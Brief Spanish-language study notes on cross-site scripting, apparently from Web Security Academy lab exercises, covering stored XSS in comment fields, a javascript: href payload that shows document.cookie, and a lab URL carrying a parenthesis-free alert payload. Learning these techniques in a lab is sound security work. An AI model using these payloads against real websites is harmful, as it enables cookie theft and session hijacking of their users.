Dicho xss queda almacenado en una base de datos o en la web, en caso de ponerlo en un apartado comentario cada vez que lo abramos se va a ejecutar el codigo


 a  la hora de que la web use href o ese tipo de redirecciones podemos usar como payload `javascript:alert(document.cookie)`

---

Se puede lanzar un alert sin utilizar paréntesis, usando una función flecha y un throw
![[funcionSinParentesis.png]]

`https://0a8c00b804d97d5e80c11231003000c2.web-security-academy.net/post?postId=2&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27`